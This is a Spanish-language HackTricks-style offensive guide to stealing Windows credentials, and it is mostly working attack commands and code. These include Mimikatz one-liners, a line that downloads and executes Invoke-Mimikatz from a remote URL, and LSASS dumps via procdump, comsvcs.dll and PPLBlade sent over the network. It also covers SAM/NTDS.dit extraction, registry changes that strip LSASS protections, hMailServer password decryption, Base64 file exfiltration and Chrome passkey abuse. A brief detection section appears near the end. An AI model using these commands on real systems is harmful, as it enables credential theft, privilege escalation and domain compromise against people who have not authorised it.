# Robo de credenciales de Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciales de Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Consulta algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Estas protecciones podrían impedir que Mimikatz extraiga algunas credenciales.**

## Credenciales con Meterpreter

Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evadiendo AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, Defender no lo detecta.\
Puedes usar esta herramienta para **hacer dump del proceso lsass**, **descargar el dump** y **extraer** las **credenciales localmente** desde el dump.

También podrías usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, ya que están **detectando** las cadenas **"procdump.exe" y "lsass.exe"**. Por lo tanto, es más **sigiloso** **pasar** como **argumento** el **PID** de lsass.exe a procdump **en lugar de** su **nombre lsass.exe.**

### Dumping lsass con **comsvcs.dll**

Una DLL llamada **comsvcs.dll**, ubicada en `C:\Windows\System32`, es responsable de **volcar la memoria de los procesos** cuando se produce un fallo. Esta DLL incluye una **función** llamada **`MiniDumpW`**, diseñada para invocarse mediante `rundll32.exe`.\
Es irrelevante utilizar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID del proceso que se volcará constituye el primer componente, la ubicación del archivo de volcado representa el segundo y el tercer componente debe ser estrictamente la palabra **full**. No existen opciones alternativas.\
Después de analizar estos tres componentes, la DLL se encarga de crear el archivo de volcado y transferir la memoria del proceso especificado a este archivo.\
El uso de **comsvcs.dll** permite volcar el proceso lsass, eliminando así la necesidad de cargar y ejecutar procdump. Este método se describe detalladamente en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

El siguiente comando se utiliza para la ejecución:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass con Task Manager**

1. Haz clic derecho en la barra de tareas y haz clic en Task Manager
2. Haz clic en More details
3. Busca el proceso "Local Security Authority Process" en la pestaña Processes
4. Haz clic derecho en el proceso "Local Security Authority Process" y haz clic en "Create dump file".

### Dumping lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Volcando lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta de volcado de procesos protegidos que permite ofuscar el volcado de memoria y transferirlo a workstations remotas sin escribirlo en el disco.

**Funcionalidades principales**:

1. Evadir la protección PPL
2. Ofuscar los archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
3. Subir el volcado de memoria mediante métodos de subida RAW y SMB sin escribirlo en el disco (volcado fileless)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper: dumping de LSASS basado en SSP sin MiniDumpWriteDump

Ink Dragon incluye un dumper de tres etapas denominado **LalsDumper** que nunca llama a `MiniDumpWriteDump`, por lo que los hooks de EDR sobre esa API nunca se activan:

1. **Stage 1 loader (`lals.exe`)**: busca en `fdp.dll` un placeholder compuesto por 32 caracteres `d` en minúscula, lo sobrescribe con la ruta absoluta a `rtu.txt`, guarda la DLL modificada como `nfdp.dll` y llama a `AddSecurityPackageA("nfdp","fdp")`. Esto obliga a **LSASS** a cargar la DLL maliciosa como un nuevo Security Support Provider (SSP).
2. **Stage 2 dentro de LSASS**: cuando LSASS carga `nfdp.dll`, la DLL lee `rtu.txt`, aplica XOR a cada byte con `0x20` y mapea el blob decodificado en memoria antes de transferir la ejecución.
3. **Stage 3 dumper**: el payload mapeado vuelve a implementar la lógica de MiniDump usando **direct syscalls** resueltos a partir de nombres de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dedicado denominado `Tom` abre `%TEMP%\<pid>.ddt`, transmite un dump comprimido de LSASS al archivo y cierra el handle para que la exfiltración pueda realizarse posteriormente.

Notas para el operador:

* Mantén `lals.exe`, `fdp.dll`, `nfdp.dll` y `rtu.txt` en el mismo directorio. Stage 1 reescribe el placeholder hard-coded con la ruta absoluta a `rtu.txt`, por lo que separarlos rompe la cadena.
* El registro se realiza añadiendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puedes establecer ese valor tú mismo para hacer que LSASS vuelva a cargar el SSP en cada arranque.
* Los archivos `%TEMP%\*.ddt` son dumps comprimidos. Descomprímelos localmente y después pásalos a Mimikatz/Volatility para extraer credenciales.
* Ejecutar `lals.exe` requiere privilegios de administrador/SeTcb para que `AddSecurityPackageA` tenga éxito; cuando la llamada retorna, LSASS carga transparentemente el SSP rogue y ejecuta Stage 2.
* Eliminar la DLL del disco no la expulsa de LSASS. Elimina la entrada del registro y reinicia LSASS (reinicio del sistema), o déjala para obtener persistencia a largo plazo.

## CrackMapExec

### Dump de hashes SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump de secretos de LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump del NTDS.dit desde el DC objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump del historial de contraseñas de NTDS.dit del DC objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet de cada cuenta de NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Estos archivos deberían estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de forma normal** porque están protegidos.

### Desde el Registry

La forma más sencilla de robar esos archivos es obtener una copia desde el Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puedes realizar copias de archivos protegidos mediante este servicio. Necesitas ser Administrator.

#### Using vssadmin

El binario vssadmin solo está disponible en versiones de Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public), pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Por último, también podrías usar el [**script de PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciales de Active Directory - NTDS.dit**

El archivo **NTDS.dit** es conocido como el núcleo de **Active Directory** y contiene datos cruciales sobre los objetos de usuario, los grupos y sus membresías. Aquí se almacenan los **password hashes** de los usuarios del dominio. Este archivo es una base de datos **Extensible Storage Engine (ESE)** y se encuentra en **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro de esta base de datos se mantienen tres tablas principales:

- **Data Table**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
- **Link Table**: Realiza un seguimiento de las relaciones, como las membresías de grupos.
- **SD Table**: Aquí se almacenan los **security descriptors** de cada objeto, garantizando la seguridad y el control de acceso de los objetos almacenados.

Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utiliza _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Por tanto, **parte** del archivo **NTDS.dit** podría encontrarse **dentro de la memoria de `lsass`** (probablemente se puede encontrar la información a la que se ha accedido más recientemente debido a la mejora del rendimiento mediante una **cache**).

#### Descifrando los hashes dentro de NTDS.dit

El hash se cifra 3 veces:

1. Descifrar la Password Encryption Key (**PEK**) utilizando la **BOOTKEY** y **RC4**.
2. Descifrar el **hash** utilizando **PEK** y **RC4**.
3. Descifrar el **hash** utilizando **DES**.

**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrada** dentro del archivo **NTDS.dit** utilizando la **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por eso, para obtener las credenciales del archivo NTDS.dit **se necesitan los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit mediante Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También puedes usar el truco de [**volume shadow copy**](#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del archivo **SYSTEM** (de nuevo, puedes [**volcarlo desde el registro o usar el truco de volume shadow copy**](#stealing-sam-and-system)).

### **Extracción de hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlas automáticamente** usando un usuario de administrador de dominio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **archivos NTDS.dit grandes**, se recomienda extraerlos usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también puedes usar el **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos de NTDS pueden extraerse a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para obtener más información cuando el archivo NTDS.dit sin procesar ya se ha recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
El hive `SYSTEM` es opcional, pero permite descifrar secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves de Kerberos o de confianza, historiales de contraseñas NT y LM). Además de otra información, se extraen los siguientes datos: cuentas de usuario y de máquina con sus hashes, flags de UAC, marca de tiempo del último inicio de sesión y cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol y membresía de las unidades organizativas, dominios de confianza con el tipo, dirección y atributos de las relaciones de confianza...

## Lazagne

Descarga el binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios programas.
```
lazagne.exe all
```
## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta se puede utilizar para extraer credenciales de la memoria. Descárgala desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraer credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecútalo** para extraer las contraseñas.

## Minería de sesiones RDP inactivas y debilitamiento de los controles de seguridad

El RAT FinalDraft de Ink Dragon incluye una tarea `DumpRDPHistory` cuyas técnicas son útiles para cualquier red-teamer:

### Recopilación de telemetría al estilo DumpRDPHistory

* **Objetivos RDP salientes** – analiza cada hive de usuario en `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subclave almacena el nombre del servidor, `UsernameHint` y la marca de tiempo de la última escritura. Puedes replicar la lógica de FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidencias de RDP entrantes** – consulta el registro `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` en busca de los Event IDs **21** (inicio de sesión exitoso) y **25** (desconexión) para identificar quién administró el equipo:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Cuando sepas qué Domain Admin se conecta habitualmente, extrae LSASS (con LalsDumper/Mimikatz) mientras su sesión **desconectada** siga existiendo. CredSSP + el fallback de NTLM dejan su verifier y sus tokens en LSASS, que posteriormente pueden reproducirse a través de SMB/WinRM para obtener `NTDS.dit` o establecer persistencia en los controladores de dominio.

### Downgrades del registro dirigidos por FinalDraft

El mismo implant también manipula varias claves del registro para facilitar el robo de credenciales:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Establecer `DisableRestrictedAdmin=1` fuerza la reutilización completa de credenciales/tickets durante RDP, habilitando pivots de estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` deshabilita el filtrado de tokens de UAC, por lo que los administradores locales obtienen tokens sin restricciones a través de la red.
* `DSRMAdminLogonBehavior=2` permite que el administrador de DSRM inicie sesión mientras el DC está en línea, proporcionando a los atacantes otra cuenta integrada con privilegios elevados.
* `RunAsPPL=0` elimina las protecciones PPL de LSASS, haciendo trivial el acceso a la memoria para dumpers como LalsDumper.

## Credenciales de la base de datos de hMailServer (post-compromise)

hMailServer almacena la contraseña de su DB en `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, bajo `[Database] Password=`. El valor está cifrado con Blowfish usando la clave estática `THIS_KEY_IS_NOT_SECRET` y cambios de endianness de palabras de 4 bytes. Usa la cadena hexadecimal del INI con este snippet de Python:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Con la contraseña en texto claro, copia la base de datos SQL CE para evitar bloqueos de archivos, carga el provider de 32 bits y actualízalo si es necesario antes de consultar los hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La columna `accountpassword` utiliza el formato de hash de hMailServer (modo `1421` de hashcat). Crackear estos valores puede proporcionar credenciales reutilizables para pivots mediante WinRM/SSH.
## Interceptación del callback de inicio de sesión de LSA (LsaApLogonUserEx2)

Algunas herramientas capturan **contraseñas de inicio de sesión en texto plano** interceptando el callback de inicio de sesión de LSA `LsaApLogonUserEx2`. La idea es hacer hook o envolver el callback del paquete de autenticación para capturar las credenciales **durante el inicio de sesión** (antes del hashing) y, después, escribirlas en disco o devolvérselas al operador. Esto suele implementarse como un helper que se inyecta en LSA o se registra con LSA, y luego registra cada evento de inicio de sesión interactivo o de red exitoso junto con el nombre de usuario, el dominio y la contraseña.

Notas operativas:
- Requiere permisos de administrador local/SYSTEM para cargar el helper en la ruta de autenticación.
- Las credenciales capturadas solo aparecen cuando se produce un inicio de sesión (interactivo, RDP, de servicio o de red, según el hook).

## Credenciales de conexión guardadas de SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) almacena la información de conexión guardada en un archivo `sqlstudio.bin` por usuario. Los dumpers específicos pueden analizar el archivo y recuperar las credenciales SQL guardadas. En shells que solo devuelven la salida de comandos, el archivo suele exfiltrarse codificándolo como Base64 e imprimiéndolo en stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
En el lado del operador, reconstruye el archivo y ejecuta el dumper localmente para recuperar credenciales:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Robo de credenciales Passkeys / WebAuthn desde Chrome en Windows

Si se obtiene **ejecución de código** como el **usuario víctima** en un host Windows que utiliza **Chrome + passkeys sincronizadas con Google Password Manager**, las passkeys se convierten en un objetivo interesante de **post-exploitation**, incluso **sin admin/SYSTEM**.

### Artefactos locales interesantes
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** almacena registros **`WebauthnCredentialSpecifics`** codificados con protobuf. Un proceso del mismo usuario puede enumerar el **RP ID**, el **username**, el **credential ID** y el material de clave privada cifrado de los passkeys sincronizados.
- **`passkey_enclave_state`** almacena el estado local de inscripción del dispositivo, como **`wrapped_identity_private_key`** y el secreto envuelto utilizado para recuperar las credenciales sincronizadas.

Triaje rápido:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Los blobs de claves vinculados al TPM aún pueden abusarse como un oráculo de firma local

Si el navegador exporta una clave de identidad respaldada por TPM como **`NCRYPT_OPAQUE_KEY_BLOB`** y almacena ese blob en un estado accesible para el usuario, el malware **no** necesita extraer la clave privada sin formato. Simplemente puede volver a importar el blob en la **misma máquina** y pedir al TPM local que firme datos controlados por el atacante:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Esto significa que **hardware binding impide la exportación fuera del dispositivo, pero no el uso por el mismo usuario en el endpoint comprometido**.

### Vías prácticas de abuso

1. **Pass-ta-key / relay de identidad del dispositivo**
- Enumerar `WebauthnCredentialSpecifics` desde el LevelDB de Chrome.
- Iniciar un inicio de sesión con passkey y obtener un desafío WebAuthn nuevo.
- Usar el blob `wrapped_identity_private_key` robado en el TPM de la víctima para firmar el binding de la solicitud del cloud-authenticator.
- Retransmitir la assertion devuelta a la relying party.
- Esto es especialmente valioso cuando el RP acepta `userVerification=preferred` o no rechaza assertions con **`UV=0`**.
2. **Secuestro de una UV-key pendiente**
- Forzar una nueva incorporación eliminando `passkey_enclave_state` o enviando una operación `device/forget` válida y firmada.
- Si la incorporación deja el dispositivo en **`uv_key_pending`**, registrar una clave pública UV controlada por el atacante.
- Si el proveedor no verifica la attestation ni el origen del secure hardware de la nueva UV key, las firmas posteriores de la clave del atacante se tratan como **`UV=1`**.
3. **Robo de recuperación del Master-secret / SDS**
- Forzar la recuperación o la reincorporación para que Chrome descargue el master secret de las passkeys sincronizadas.
- Vigilar la recreación o modificación de `passkey_enclave_state`; después, volcar la memoria de Chrome mientras el **security domain secret (SDS)** en texto plano esté presente.
- Usar el SDS recuperado para descifrar los campos cifrados de cada registro `WebauthnCredentialSpecifics` y recuperar claves privadas WebAuthn portables.

### Ideas de DFIR / detección

- Monitorizar la **eliminación o recreación** de `passkey_enclave_state`.
- Generar una alerta ante accesos anómalos a **`Sync Data\LevelDB`** de Chrome por procesos que no sean navegadores.
- Generar alertas ante **volcados de memoria de Chrome** o accesos sospechosos a memoria entre procesos.
- Investigar solicitudes repetidas del **PIN de recuperación de Google Password Manager** o nuevas incorporaciones inesperadas.
- Recordar que **`signCount`** de WebAuthn a menudo no es útil para passkeys sincronizadas, ya que puede permanecer constante; por ello, la detección clásica de clones es débil.

## Referencias

- [Unit 42 – Una investigación sobre años de operaciones no detectadas dirigidas contra sectores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: phishing mediante macro VBA de Word vía SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 para obtener SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Dentro de Ink Dragon: revelación de la red de relay y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: una nueva superficie de ataque en la autenticación sin contraseñas](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / almacenamiento de claves CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
